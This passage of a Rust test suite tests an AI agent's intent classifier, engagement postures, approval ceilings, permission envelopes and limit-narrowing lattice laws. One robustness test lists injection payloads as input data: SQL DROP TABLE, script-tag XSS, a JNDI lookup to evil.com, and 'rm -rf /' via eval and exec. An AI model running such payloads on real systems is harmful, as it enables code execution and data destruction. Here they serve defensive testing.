        std::slice::from_ref(&downplayed),
        "cheap-model",
        "digest",
        &Authority::default(),
        &ResolverConfig::default(),
        true,
    );
    assert_eq!(
        intent.reading.stakes,
        Stakes::Irreversible,
        "classifier must not lower stakes below the act floor"
    );
}

#[test]
fn classification_empty_leaves_free_tier_intact() {
    let partial = resolve_text("refactor the parser");
    let before_reading = partial.reading.clone();
    let before_engagement = partial.engagement.clone();
    let after = apply_classification(
        partial,
        std::slice::from_ref(&Classification::default()),
        "flaky-model",
        "digest",
        &Authority::default(),
        &ResolverConfig::default(),
        true,
    );
    assert_eq!(after.reading, before_reading);
    assert_eq!(after.engagement, before_engagement);
}

#[test]
fn classification_only_overwrites_returned_axes() {
    let partial = resolve_text("deploy to production");
    let classification = Classification {
        act: Some("operate".into()),
        ..Classification::default()
    };
    let intent = apply_classification(
        partial,
        std::slice::from_ref(&classification),
        "local-model",
        "abc123",
        &Authority::default(),
        &ResolverConfig::default(),
        false,
    );
    assert_eq!(intent.reading.act, Act::Operate);
    assert!(!intent.provenance.reproducible);
    assert_eq!(intent.provenance.tier, Tier::LocalModel);
}

// ================================================================
// Part 7: Engagement derivation — matrix tests
// ================================================================

#[test]
fn engagement_output_shape_per_act() {
    let cases: &[(Act, OutputShape)] = &[
        (Act::Converse, OutputShape::Prose),
        (Act::Answer, OutputShape::Prose),
        (Act::Locate, OutputShape::Findings),
        (Act::Analyze, OutputShape::Prose),
        (Act::Author, OutputShape::Artifact),
        (Act::Modify, OutputShape::Diff),
        (Act::Operate, OutputShape::Report),
        (Act::Verify, OutputShape::Matrix),
        (Act::Orchestrate, OutputShape::Report),
        (Act::Govern, OutputShape::Report),
    ];
    for (act, expected_shape) in cases {
        let r = reading_simple(*act, Horizon::Turn, Stakes::Reversible, Evidence::None);
        let engagement = derive(&r, &Authority::default(), true);
        assert_eq!(
            engagement.posture.delivery.shape, *expected_shape,
            "act {:?} should produce shape {:?}",
            act, expected_shape
        );
    }
}

#[test]
fn engagement_output_shape_cited_evidence_for_answer_analyze() {
    for act in [Act::Answer, Act::Analyze] {
        let r = reading_simple(act, Horizon::Turn, Stakes::Inert, Evidence::Cited);
        let engagement = derive(&r, &Authority::default(), true);
        assert_eq!(
            engagement.posture.delivery.shape,
            OutputShape::Sources,
            "{:?} with Cited evidence should produce Sources shape",
            act
        );
    }
}

#[test]
fn engagement_stop_profile_per_act() {
    let cases: &[(Act, StopProfile)] = &[
        (Act::Converse, StopProfile::Message),
        (Act::Answer, StopProfile::Message),
        (Act::Locate, StopProfile::Inspection),
        (Act::Analyze, StopProfile::Inspection),
        (Act::Author, StopProfile::Inspection),
        (Act::Operate, StopProfile::Effect),
        // Verify with no verified/audit evidence → Inspection (not
        // Verification, which requires evidence >= Verified).
        (Act::Verify, StopProfile::Inspection),
        (Act::Orchestrate, StopProfile::Inspection),
        (Act::Govern, StopProfile::Effect),
    ];
    for (act, expected_stop) in cases {
        let r = reading_simple(*act, Horizon::Turn, Stakes::Reversible, Evidence::None);
        let engagement = derive(&r, &Authority::default(), true);
        assert_eq!(
            engagement.posture.stop, *expected_stop,
            "act {:?} should produce stop {:?}",
            act, expected_stop
        );
    }
}

#[test]
fn engagement_stop_profile_verified_overrides_act() {
    for act in Act::ALL {
        let r = reading_simple(act, Horizon::Turn, Stakes::Inert, Evidence::Verified);
        let engagement = derive(&r, &Authority::default(), true);
        assert_eq!(
            engagement.posture.stop,
            StopProfile::Verification,
            "{:?} with Verified evidence should use Verification stop",
            act
        );
    }
}

#[test]
fn engagement_context_profile_per_act_and_horizon() {
    let r = reading_simple(
        Act::Converse,
        Horizon::Immediate,
        Stakes::Inert,
        Evidence::None,
    );
    let engagement = derive(&r, &Authority::default(), true);
    assert_eq!(engagement.posture.context, ContextProfile::Minimal);

    for act in [Act::Modify, Act::Verify, Act::Operate] {
        let r = reading_simple(act, Horizon::Turn, Stakes::Reversible, Evidence::None);
        let engagement = derive(&r, &Authority::default(), true);
        assert_eq!(engagement.posture.context, ContextProfile::Working);
    }

    for act in [Act::Modify, Act::Operate] {
        let r = reading_simple(act, Horizon::Durable, Stakes::Reversible, Evidence::None);
        let engagement = derive(&r, &Authority::default(), true);
        assert_eq!(engagement.posture.context, ContextProfile::Full);
    }
}

#[test]
fn engagement_hil_mode_matrix() {
    for autonomy in Autonomy::ALL {
        for attendance in Attendance::ALL {
            let r = reading_simple(
                Act::Operate,
                Horizon::Turn,
                Stakes::Irreversible,
                Evidence::None,
            );
            let auth = authority_of(autonomy, attendance);
            let engagement = derive(&r, &auth, true);
            assert_eq!(
                engagement.posture.hil,
                HilMode::Interrupt,
                "Irreversible must always interrupt: autonomy={:?} attendance={:?}",
                autonomy,
                attendance
            );
        }
    }

    let r = reading_simple(
        Act::Modify,
        Horizon::Turn,
        Stakes::Reversible,
        Evidence::None,
    );
    let auth = authority_of(Autonomy::Autonomous, Attendance::Interactive);
    let engagement = derive(&r, &auth, true);
    assert_eq!(engagement.posture.hil, HilMode::Review);

    let r = reading_simple(
        Act::Modify,
        Horizon::Turn,
        Stakes::Reversible,
        Evidence::None,
    );
    // Delegation alone is not a boundary: the turn reviews like any other
    // reversible work until a strand is known to serve an enveloped
    // commitment.
    let auth = authority_of(Autonomy::Delegated, Attendance::Interactive);
    let engagement = derive(&r, &auth, true);
    assert_eq!(engagement.posture.hil, HilMode::Review);
    assert_eq!(engagement.limits.approval_ceiling, ApprovalCeiling::Ask);
}

/// A strand serving a commitment with a live grant works inside it: the
/// grant's permission and spend ceilings narrow that strand, and under
/// delegation it proceeds inside the envelope rather than asking first.
#[test]
fn an_envelope_narrows_the_strand_that_serves_its_commitment() {
    let now = Utc::now();
    let auth = authority_of(Autonomy::Delegated, Attendance::Interactive);
    let intent = resolve(
        &req("refactor the parser module"),
        &Declared::default(),
        &auth,
        &ResolverConfig::default(),
    )
    .intent();
    let strand_id = intent.strands[0].strand_id.clone();
    let envelopes = BTreeMap::from([(strand_id, test_envelope(PermissionCeiling::WorkspaceWrite))]);
    let narrowed = apply_envelopes(intent.clone(), &envelopes, Autonomy::Delegated, now);
    let strand = &narrowed.strands[0];
    assert_eq!(strand.engagement.posture.hil, HilMode::Envelope);
    assert_eq!(
        strand.engagement.limits.permission_ceiling,
        PermissionCeiling::WorkspaceWrite
    );
    assert_eq!(strand.engagement.limits.spend_ceiling_usd, Some(5.0));
    assert!(
        narrowed
            .engagement
            .limits
            .is_at_most(&intent.engagement.limits)
    );

    // A revoked or expired grant narrows nothing and grants nothing.
    for dead in [
        Envelope {
            revoked_at: Some(now),
            ..test_envelope(PermissionCeiling::ReadOnly)
        },
        Envelope {
            expires_at: Some(now - chrono::Duration::hours(1)),
            ..test_envelope(PermissionCeiling::ReadOnly)
        },
    ] {
        let envelopes = BTreeMap::from([(intent.strands[0].strand_id.clone(), dead)]);
        let untouched = apply_envelopes(intent.clone(), &envelopes, Autonomy::Delegated, now);
        assert_eq!(untouched, intent);
    }
}

#[test]
fn engagement_demand_hints_populated() {
    for act in [Act::Analyze, Act::Author, Act::Modify, Act::Orchestrate] {
        let r = reading_simple(act, Horizon::Durable, Stakes::Reversible, Evidence::None);
        let engagement = derive(&r, &Authority::default(), true);
        assert!(
            engagement.posture.demand.reasoning_required,
            "{:?} should require reasoning",
            act
        );
    }

    let r = reading_simple(Act::Answer, Horizon::Turn, Stakes::Inert, Evidence::Cited);
    let engagement = derive(&r, &Authority::default(), true);
    assert!(engagement.posture.demand.evidence_required);

    let r = reading_simple(
        Act::Modify,
        Horizon::Turn,
        Stakes::Reversible,
        Evidence::None,
    );
    let engagement = derive(&r, &Authority::default(), true);
    assert!(engagement.posture.demand.structured_output);
}

#[test]
fn engagement_delivery_posture_by_attendance_and_stakes() {
    for attendance in Attendance::ALL {
        let r = reading_simple(
            Act::Operate,
            Horizon::Turn,
            Stakes::Irreversible,
            Evidence::None,
        );
        // Delivery urgency derives from reading.stakes (not authority.attendance):
        // Irreversible stakes always Interrupt regardless of attendance.
        let r = Reading { attendance, ..r };
        let engagement = derive(&r, &authority_of(Autonomy::Assisted, attendance), true);
        assert_eq!(engagement.posture.delivery.urgency, Urgency::Interrupt);
    }

    let mut r = reading_simple(Act::Verify, Horizon::Durable, Stakes::Inert, Evidence::None);
    r.attendance = Attendance::Unattended;
    let engagement = derive(
        &r,
        &authority_of(Autonomy::Assisted, Attendance::Unattended),
        true,
    );
    assert_eq!(engagement.posture.delivery.cadence, Cadence::Digest);
    assert_eq!(engagement.posture.delivery.urgency, Urgency::Quiet);

    let r = reading_simple(Act::Answer, Horizon::Turn, Stakes::Inert, Evidence::None);
    let engagement = derive(&r, &Authority::default(), true);
    assert_eq!(engagement.posture.delivery.cadence, Cadence::Live);
}

#[test]
fn engagement_min_satisfaction_per_evidence() {
    let cases: &[(Evidence, Satisfaction)] = &[
        (Evidence::None, Satisfaction::Asserted),
        (Evidence::Cited, Satisfaction::Cited),
        (Evidence::Verified, Satisfaction::Observed),
        (Evidence::Audited, Satisfaction::Attested),
    ];
    for (evidence, expected_sat) in cases {
        let r = reading_simple(Act::Modify, Horizon::Session, Stakes::Reversible, *evidence);
        let engagement = derive(&r, &Authority::default(), true);
        assert_eq!(engagement.limits.min_satisfaction, *expected_sat);
    }
}

#[test]
fn engagement_domain_requirements_per_act() {
    let cases: &[(Act, &[&str])] = &[
        (Act::Converse, &[]),
        (Act::Answer, &["live-data", "web"]),
        (Act::Locate, &["live-data", "web", "vcs"]),
        (Act::Analyze, &["live-data", "web", "code-exec", "vcs"]),
        (Act::Author, &["documents", "web"]),
        (Act::Modify, &["documents", "code-exec", "vcs"]),
        (
            Act::Operate,
            &[
                "code-exec",
                "web",
                "live-data",
                "messaging",
                "documents",
                "orchestration",
            ],
        ),
        (Act::Verify, &["code-exec", "observability"]),
        (Act::Orchestrate, &["orchestration", "code-exec"]),
        (
            Act::Govern,
            &["memory", "orchestration", "documents", "observability"],
        ),
    ];
    for (act, expected_domains) in cases {
        let r = reading_simple(*act, Horizon::Turn, Stakes::Reversible, Evidence::None);
        let engagement = derive(&r, &Authority::default(), true);
        for domain in *expected_domains {
            assert!(
                engagement.limits.required_domains.contains(domain),
                "{:?} should require domain `{domain}`",
                act
            );
        }
    }
}

#[test]
fn engagement_cited_evidence_adds_live_data_and_web() {
    for act in Act::ALL {
        let r = reading_simple(act, Horizon::Turn, Stakes::Reversible, Evidence::Cited);
        let engagement = derive(&r, &Authority::default(), true);
        assert!(engagement.limits.required_domains.contains("live-data"));
        assert!(engagement.limits.required_domains.contains("web"));
    }
}

#[test]
fn engagement_clarify_policy_by_stakes() {
    for act in [Act::Converse, Act::Answer] {
        let mut r = reading_simple(act, Horizon::Turn, Stakes::Inert, Evidence::None);
        r.clarity = Clarity::Ambiguous;
        let engagement = derive(&r, &Authority::default(), true);
        assert_eq!(engagement.posture.clarify, ClarifyPolicy::StateAssumption);
    }

    let mut r = reading_simple(Act::Operate, Horizon::Turn, Stakes::Costly, Evidence::None);
    r.clarity = Clarity::Ambiguous;
    let engagement = derive(&r, &Authority::default(), true);
    assert_eq!(engagement.posture.clarify, ClarifyPolicy::Ask);

    let r = reading_simple(
        Act::Modify,
        Horizon::Turn,
        Stakes::Reversible,
        Evidence::None,
    );
    let engagement = derive(&r, &Authority::default(), true);
    assert_eq!(engagement.posture.clarify, ClarifyPolicy::Proceed);
}

#[test]
fn engagement_checkpoints_for_effectful_stakes_reversible_plus() {
    for stakes in [Stakes::Reversible, Stakes::Costly, Stakes::Irreversible] {
        let r = reading_simple(Act::Modify, Horizon::Session, stakes, Evidence::None);
        let engagement = derive(&r, &Authority::default(), true);
        assert!(engagement.posture.checkpoint_before_effect);
    }

    let r = reading_simple(Act::Answer, Horizon::Turn, Stakes::Inert, Evidence::None);
    let engagement = derive(&r, &Authority::default(), true);
    assert!(!engagement.posture.checkpoint_before_effect);
}

#[test]
fn engagement_any_effectful_contender_forces_checkpoint() {
    let r = reading_simple(
        Act::Answer,
        Horizon::Session,
        Stakes::Reversible,
        Evidence::None,
    );
    let engagement = derive(&r, &Authority::default(), true);
    assert!(!engagement.posture.checkpoint_before_effect);

    let mut r2 = reading_simple(
        Act::Answer,
        Horizon::Session,
        Stakes::Reversible,
        Evidence::None,
    );
    r2.alternate_acts.insert(Act::Modify);
    let engagement2 = derive(&r2, &Authority::default(), true);
    assert!(engagement2.posture.checkpoint_before_effect);
    // The stop rule follows the primary act; a contender only widens the
    // toolbox and the checkpoint.
    assert_eq!(engagement2.posture.stop, StopProfile::Message);
}

#[test]
fn engagement_note_content() {
    let r = reading_simple(
        Act::Operate,
        Horizon::Turn,
        Stakes::Irreversible,
        Evidence::None,
    );
    let engagement = derive(&r, &Authority::default(), true);
    let note = engagement.posture.note.as_deref().unwrap_or("");
    assert!(note.contains("cannot be undone"));

    let r = reading_simple(
        Act::Modify,
        Horizon::Turn,
        Stakes::Reversible,
        Evidence::Verified,
    );
    let engagement = derive(&r, &Authority::default(), true);
    let note = engagement.posture.note.as_deref().unwrap_or("");
    assert!(note.contains("runtime") || note.contains("decide"));

    let r = reading_simple(Act::Answer, Horizon::Turn, Stakes::Inert, Evidence::Cited);
    let engagement = derive(&r, &Authority::default(), true);
    let note = engagement.posture.note.as_deref().unwrap_or("");
    assert!(note.contains("source"));

    let r = reading_simple(
        Act::Converse,
        Horizon::Immediate,
        Stakes::Inert,
        Evidence::None,
    );
    let engagement = derive(&r, &Authority::default(), true);
    assert!(engagement.posture.note.is_none());
}

// ================================================================
// Part 8: Authority composition
// ================================================================

#[test]
fn authority_approval_ceiling_irreversible_always_asks() {
    for autonomy in Autonomy::ALL {
        for attendance in Attendance::ALL {
            let auth = authority_of(autonomy, attendance);
            assert_eq!(
                auth.approval_ceiling(Stakes::Irreversible),
                ApprovalCeiling::Ask,
                "Irreversible must always ask: autonomy={autonomy:?} attendance={attendance:?}"
            );
        }
    }
}

/// Delegation asks at the turn level; the gate lets through only the
/// actions a live envelope covers.
#[test]
fn authority_approval_ceiling_delegated_asks_at_the_turn_level() {
    let auth = authority_of(Autonomy::Delegated, Attendance::Interactive);
    assert_eq!(
        auth.approval_ceiling(Stakes::Reversible),
        ApprovalCeiling::Ask
    );
}

#[test]
fn authority_approval_ceiling_composes_only_tightens() {
    for a in ApprovalCeiling::ALL {
        for b in ApprovalCeiling::ALL {
            let met = a.meet(b);
            assert!(met.rank() <= a.rank());
            assert!(met.rank() <= b.rank());
        }
    }
}

#[test]
fn authority_gate_fallback_by_attendance_and_horizon() {
    let auth = authority_of(Autonomy::Assisted, Attendance::Interactive);
    assert_eq!(auth.gate_fallback(Horizon::Turn), GateFallback::Deny);
    assert_eq!(auth.gate_fallback(Horizon::Durable), GateFallback::Deny);

    // Only work durable enough to own a commitment has somewhere to park a
    // question; multi-step work inside one session fails closed like a turn.
    let auth = authority_of(Autonomy::Delegated, Attendance::Unattended);
    assert_eq!(auth.gate_fallback(Horizon::Durable), GateFallback::Defer);
    assert_eq!(auth.gate_fallback(Horizon::Session), GateFallback::Deny);
    assert_eq!(auth.gate_fallback(Horizon::Immediate), GateFallback::Deny);
    assert_eq!(auth.gate_fallback(Horizon::Turn), GateFallback::Deny);
}

#[test]
fn authority_escalation_refuses_irreversible_assume() {
    let policy = Escalation::AssumeConservative { after_hours: 24 };
    assert!(policy.permitted_for(Stakes::Reversible));
    assert!(policy.permitted_for(Stakes::Costly));
    assert!(!policy.permitted_for(Stakes::Irreversible));
    assert!(Escalation::WaitIndefinitely.permitted_for(Stakes::Irreversible));
    assert!(Escalation::AbandonAfter { after_hours: 24 }.permitted_for(Stakes::Irreversible));
}

#[test]
fn authority_autonomy_capped_by_never_widens() {
    for a in Autonomy::ALL {
        for b in Autonomy::ALL {
            let capped = a.capped_by(b);
            assert!(capped.rank() <= a.rank());
            assert!(capped.rank() <= b.rank());
        }
    }
}

#[test]
fn authority_envelope_covers_paths() {
    let env = test_envelope(PermissionCeiling::WorkspaceWrite);
    assert!(env.covers("edit", &["src/main.rs".to_string()]));
    assert!(env.covers("edit", &["src/deep/nested/file.rs".to_string()]));
    assert!(!env.covers("bash", &["src/main.rs".to_string()]));
    assert!(!env.covers("edit", &["docs/readme.md".to_string()]));
    assert!(!env.covers(
        "edit",
        &["src/main.rs".to_string(), "docs/x.md".to_string()]
    ));
    assert!(!env.covers("edit", &[]));
}

// ================================================================
// Part 9: Narrowing invariant — full combinatorial
// ================================================================

#[test]
fn narrowing_invariant_full_combinatorial() {
    let baseline = Limits::unrestricted();
    let mut checked = 0u64;
    for &act in &Act::ALL {
        for &horizon in &Horizon::ALL {
            for &stakes in &Stakes::ALL {
                for &evidence in &Evidence::ALL {
                    for &clarity in &Clarity::ALL {
                        for &attendance in &Attendance::ALL {
                            for &autonomy in &Autonomy::ALL {
                                for &slice in &[true, false] {
                                    let mut r = reading_simple(act, horizon, stakes, evidence);
                                    r.clarity = clarity;
                                    r.attendance = attendance;
                                    r.confidence = 0.9;
                                    r.axis_confidence = Confidences {
                                        act: 0.9,
                                        horizon: 0.9,
                                        stakes: 0.9,
                                        evidence: 0.9,
                                    };
                                    let auth = authority_of(autonomy, attendance);
                                    let engagement = derive(&r, &auth, slice);
                                    assert!(
                                        engagement.limits.is_at_most(&baseline),
                                        "widened: {:?}/{:?}/{:?}/{:?}/{:?}/{:?}/{:?} slice={slice}",
                                        act,
                                        horizon,
                                        stakes,
                                        evidence,
                                        clarity,
                                        attendance,
                                        autonomy
                                    );
                                    checked += 1;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    assert_eq!(checked, 46_080);
}

#[test]
fn narrowing_invariant_full_combinatorial_with_envelope() {
    let baseline = Limits::unrestricted();
    let mut checked = 0u64;
    for &act in &Act::ALL {
        for &horizon in &Horizon::ALL {
            for &stakes in &Stakes::ALL {
                for &evidence in &Evidence::ALL {
                    for &clarity in &Clarity::ALL {
                        for &attendance in &Attendance::ALL {
                            for &autonomy in &Autonomy::ALL {
                                for &slice in &[true, false] {
                                    let mut r = reading_simple(act, horizon, stakes, evidence);
                                    r.clarity = clarity;
                                    r.attendance = attendance;
                                    r.confidence = 0.9;
                                    r.axis_confidence = Confidences {
                                        act: 0.9,
                                        horizon: 0.9,
                                        stakes: 0.9,
                                        evidence: 0.9,
                                    };
                                    let auth = authority_of(autonomy, attendance);
                                    let engagement = derive(&r, &auth, slice);
                                    assert!(
                                        engagement.limits.is_at_most(&baseline),
                                        "widened: {:?}/{:?}/{:?}/{:?}/{:?}/{:?}/{:?} slice={slice}",
                                        act,
                                        horizon,
                                        stakes,
                                        evidence,
                                        clarity,
                                        attendance,
                                        autonomy
                                    );
                                    checked += 1;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    assert_eq!(checked, 46_080);
}

#[test]
fn engagement_meet_never_widens_either_operand() {
    let mut readings = Vec::new();
    for &act in &Act::ALL {
        for &horizon in &[Horizon::Turn, Horizon::Session, Horizon::Durable] {
            for &stakes in &[Stakes::Reversible, Stakes::Costly] {
                for &evidence in &[Evidence::None, Evidence::Cited, Evidence::Verified] {
                    for slice in [true, false] {
                        let r = reading_simple(act, horizon, stakes, evidence);
                        readings.push(derive(&r, &Authority::default(), slice));
                    }
                }
            }
        }
    }
    let baseline = Limits::unrestricted();
    let mut tested = 0u64;
    for i in 0..readings.len() {
        for j in i..readings.len() {
            let met = readings[i].limits.meet(&readings[j].limits);
            assert!(met.is_at_most(&readings[i].limits));
            assert!(met.is_at_most(&readings[j].limits));
            assert!(met.is_at_most(&baseline));
            tested += 1;
        }
    }
    assert!(tested > 0);
}

// ================================================================
// Part 10: Lattice law verification
// ================================================================

#[test]
fn lattice_meet_is_idempotent() {
    for &act in &Act::ALL {
        for &horizon in &Horizon::ALL {
            for &stakes in &Stakes::ALL {
                for &evidence in &Evidence::ALL {
                    let r = reading_simple(act, horizon, stakes, evidence);
                    for &autonomy in &Autonomy::ALL {
                        let auth = authority_of(autonomy, Attendance::Interactive);
                        for slice in [true, false] {
                            let e = derive(&r, &auth, slice);
                            assert_eq!(e.limits.meet(&e.limits), e.limits);
                        }
                    }
                }
            }
        }
    }
}

#[test]
fn lattice_meet_is_commutative() {
    let readings: Vec<Reading> = Act::ALL
        .iter()
        .flat_map(|&act| {
            Horizon::ALL.iter().flat_map(move |&h| {
                Stakes::ALL.iter().flat_map(move |&s| {
                    Evidence::ALL
                        .iter()
                        .map(move |&e| reading_simple(act, h, s, e))
                })
            })
        })
        .collect();
    let engagements: Vec<Engagement> = readings
        .iter()
        .map(|r| derive(r, &Authority::default(), true))
        .collect();
    for i in 0..engagements.len() {
        for j in (i + 1)..engagements.len().min(i + 20) {
            let a = &engagements[i];
            let b = &engagements[j];
            assert_eq!(a.limits.meet(&b.limits), b.limits.meet(&a.limits));
        }
    }
}

#[test]
fn lattice_meet_is_associative() {
    let mut limits_list = Vec::new();
    for &act in &Act::ALL {
        for &stakes in &Stakes::ALL {
            let r = reading_simple(act, Horizon::Session, stakes, Evidence::None);
            limits_list.push(derive(&r, &Authority::default(), true).limits);
        }
    }
    for i in 0..limits_list.len() {
        for j in (i + 1)..limits_list.len().min(i + 10) {
            for k in (j + 1)..limits_list.len().min(j + 10) {
                let a = &limits_list[i];
                let b = &limits_list[j];
                let c = &limits_list[k];
                let left = a.meet(b).meet(c);
                let right = a.meet(&b.meet(c));
                assert_eq!(left, right, "meet not associative at {},{},{}", i, j, k);
            }
        }
    }
}

#[test]
fn lattice_unrestricted_is_identity() {
    let samples: Vec<Limits> = Act::ALL
        .iter()
        .flat_map(|&act| {
            Stakes::ALL.iter().map(move |&stakes| {
                let r = reading_simple(act, Horizon::Session, stakes, Evidence::None);
                derive(&r, &Authority::default(), true).limits
            })
        })
        .collect();
    for limits in &samples {
        assert_eq!(limits.meet(&Limits::unrestricted()), *limits);
        assert_eq!(Limits::unrestricted().meet(limits), *limits);
        assert!(limits.is_at_most(&Limits::unrestricted()));
    }
}

#[test]
fn lattice_widening_any_field_is_detected() {
    let narrow = Limits {
        required_domains: DomainSet::only(["filesystem"]),
        spend_ceiling_usd: Some(0.5),
        approval_ceiling: ApprovalCeiling::Ask,
        permission_ceiling: PermissionCeiling::ReadOnly,
        min_satisfaction: Satisfaction::Attested,
        required_modalities: BTreeSet::from([Modality::Image]),
    };
    let widened = vec![
        Limits {
            required_domains: DomainSet::All,
            ..narrow.clone()
        },
        Limits {
            spend_ceiling_usd: Some(5.0),
            ..narrow.clone()
        },
        Limits {
            approval_ceiling: ApprovalCeiling::AutoApprove,
            ..narrow.clone()
        },
        Limits {
            permission_ceiling: PermissionCeiling::FullAccess,
            ..narrow.clone()
        },
        Limits {
            min_satisfaction: Satisfaction::Asserted,
            ..narrow.clone()
        },
        Limits {
            required_modalities: BTreeSet::new(),
            ..narrow.clone()
        },
    ];
    for candidate in &widened {
        assert!(
            !candidate.is_at_most(&narrow),
            "widening went undetected: {:?}",
            candidate
        );
    }
}

#[test]
fn domain_set_meet_and_at_most_laws() {
    let all = DomainSet::All;
    let only_ab = DomainSet::only(["a", "b"]);
    let only_bc = DomainSet::only(["b", "c"]);
    let only_b = DomainSet::only(["b"]);

    assert_eq!(all.meet(&only_ab), only_ab);
    assert_eq!(only_ab.meet(&all), only_ab);
    assert_eq!(only_ab.meet(&only_bc), only_b);

    assert!(only_ab.is_at_most(&all));
    assert!(only_b.is_at_most(&only_ab));
    assert!(!only_ab.is_at_most(&only_b));
    assert!(!all.is_at_most(&only_ab));
}

// ================================================================
// Part 11: Edge cases and adversarial inputs
// ================================================================

#[test]
fn edge_empty_string_does_not_crash() {
    let extraction = extract(&req(""));
    assert!(extraction.act.winner().is_none());
    let intent = resolve_text("");
    assert!(intent.engagement.limits.is_at_most(&Limits::unrestricted()));
}

#[test]
fn edge_whitespace_only_does_not_crash() {
    let extraction = extract(&req("   \n\t  "));
    assert!(extraction.act.winner().is_none());
    let intent = resolve_text("   \n\t  ");
    assert!(intent.engagement.limits.is_at_most(&Limits::unrestricted()));
}

#[test]
fn edge_very_long_input_does_not_crash() {
    let long = "deploy to production ".repeat(500);
    let extraction = extract(&req(&long));
    assert_eq!(
        extraction.act.winner().map(|w| w.0),
        Some(Act::Operate),
        "long input with 'deploy' should still read as Operate"
    );
    let intent = resolve_text(&long);
    assert!(intent.engagement.limits.is_at_most(&Limits::unrestricted()));
}

#[test]
fn edge_unicode_input_does_not_crash() {
    let cases: &[&str] = &[
        "你好",
        "Bonjour",
        "こんにちは",
        "🚀 deploy",
        "café menu",
        "naïve résumé",
        "Zürich",
        "Москва",
        "🎉 party",
        "🎉",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let _ = extraction.act.winner();
        let intent = resolve_text(text);
        assert!(intent.engagement.limits.is_at_most(&Limits::unrestricted()));
    }
}

#[test]
fn edge_code_blocks_are_handled() {
    let text = "fix this code:\n```rust\nfn broken() { panic!() }\n```";
    let extraction = extract(&req(text));
    assert!(
        extraction
            .act
            .ranked()
            .iter()
            .any(|(a, _)| *a == Act::Modify)
    );
}

#[test]
fn edge_urls_are_detected() {
    let text = "analyze https://example.com/data";
    let extraction = extract(&req(text));
    assert!(
        extraction
            .act
            .ranked()
            .iter()
            .any(|(a, _)| *a == Act::Analyze)
    );
    let has_url_signal = extraction.signals.iter().any(|s| s.name == "url");
    assert!(has_url_signal, "URL should produce a structural signal");
}

#[test]
fn edge_file_paths_are_detected() {
    let cases: &[&str] = &[
        "edit src/main.rs",
        "read config/app.toml",
        "check tests/parser.rs",
        "find docs/README.md",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let has_path_signal = extraction.signals.iter().any(|s| s.name == "path-mention");
        assert!(
            has_path_signal,
            "`{}` should produce a path-mention signal",
            text
        );
    }
}

#[test]
fn edge_negation_does_not_invert_act() {
    let text = "don't deploy to production";
    let extraction = extract(&req(text));
    assert!(
        extraction
            .act
            .ranked()
            .iter()
            .any(|(a, _)| *a == Act::Operate),
        "negation should not suppress the act signal entirely"
    );
}

#[test]
fn edge_multilingual_text_does_not_crash() {
    let cases: &[&str] = &[
        "deploy auf die produktion",
        "fix the bug et déployez le fix",
        "réparer le bug and deploy to prod",
        "部署到生产环境",
        "¿cómo funciona esto?",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let _ = extraction.act.winner();
        let intent = resolve_text(text);
        assert!(intent.engagement.limits.is_at_most(&Limits::unrestricted()));
    }
}

#[test]
fn edge_code_injection_in_text_does_not_crash() {
    let cases: &[&str] = &[
        "'; DROP TABLE sessions; --",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/exploit}",
        "eval('rm -rf /')",
        "require('child_process').exec('rm -rf /')",
        "{{config.SECRET_KEY}}",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let _ = extraction.act.winner();
        let intent = resolve_text(text);
        assert!(intent.engagement.limits.is_at_most(&Limits::unrestricted()));
    }
}

#[test]
fn edge_no_signals_yields_low_confidence() {
    // Text between 25 and 399 chars with no lexicon match: no structural
    // horizon signal (length:short needs <=24, length:long needs >=400),
    // no act verb, no horizon phrase.
    let extraction = extract(&req("supercalifragilistic_expialidocious_baz_qux"));
    assert!(extraction.act.winner().is_none());
    assert!(
        extraction.horizon.winner().is_none(),
        "longer gibberish should have no horizon winner, got {:?}",
        extraction.horizon.winner()
    );
}

#[test]
fn edge_case_insensitive_matching() {
    let lower = extract(&req("DEPLOY TO PRODUCTION"));
    let upper = extract(&req("deploy to production"));
    assert_eq!(
        lower.act.winner().map(|w| w.0),
        upper.act.winner().map(|w| w.0)
    );
    assert_eq!(
        lower.stakes_from_words.winner().map(|w| w.0),
        upper.stakes_from_words.winner().map(|w| w.0)
    );
}

#[test]
fn edge_attachment_modalities_aggregate() {
    let attachments = vec![
        Attachment {
            modality: Modality::Image,
            name: "screenshot.png".into(),
        },
        Attachment {
            modality: Modality::Audio,
            name: "recording.wav".into(),
        },
    ];
    let mut request = req("analyze this");
    request.attachments = &attachments;
    let extraction = extract(&request);
    assert!(extraction.input_modalities.contains(&Modality::Image));
    assert!(extraction.input_modalities.contains(&Modality::Audio));
    assert!(extraction.input_modalities.contains(&Modality::Text));
}

#[test]
fn edge_previous_act_adds_continuity_signal() {
    let mut request = req("check the logs");
    request.history.previous_act = Some(Act::Modify);
    request.history.turn_index = 2;
    let extraction = extract(&request);
    let has_continuity = extraction
        .signals
        .iter()
        .any(|s| s.name.starts_with("continues:"));
    assert!(
        has_continuity,
        "previous act should add a continuity signal"
    );
}

#[test]
fn edge_repo_detection_adds_domain() {
    let extraction = extract(&req_full("fix the bug", Surface::Cli, true, false, None, 0));
    assert!(
        extraction
            .domains_from_environment
            .contains(&"engineering".to_string()),
        "repo should add 'engineering' as an environment-derived domain"
    );
}

/// Environment signals apply only to effectful acts (docs/design/
/// 47-commitment-kernel.md, "a repository mid-edit does not make answering
/// a question risky"). A git repository says nothing about the subject of a
/// non-effectful request asked inside it, so `engineering` must not reach
/// the resolved reading for a poem just because the workspace is a repo.
#[test]
fn a_git_repo_does_not_tag_engineering_on_a_non_effectful_request() {
    let intent = resolve(
        &req_full(
            "write a short poem about the sea",
            Surface::Cli,
            true,
            false,
            None,
            0,
        ),
        &Declared::default(),
        &Authority::default(),
        &ResolverConfig::default(),
    )
    .intent();
    assert_eq!(intent.reading.act, Act::Author);
    assert!(!intent.reading.act.is_effectful());
    assert!(
        !intent.reading.domains.contains("engineering"),
        "domains: {:?}",
        intent.reading.domains
    );
}

#[test]
fn edge_dirty_tree_adds_stakes_for_effectful_acts() {
    let extraction = extract(&req_full(
        "refactor the parser",
        Surface::Cli,
        true,
        true,
        None,
        0,
    ));
    assert!(extraction.stakes_from_environment.winner().is_some());

    let intent = resolve(
        &req_full(
            "what is the meaning of life",
            Surface::Cli,
            true,
            true,
            None,
            0,
        ),
        &Declared::default(),
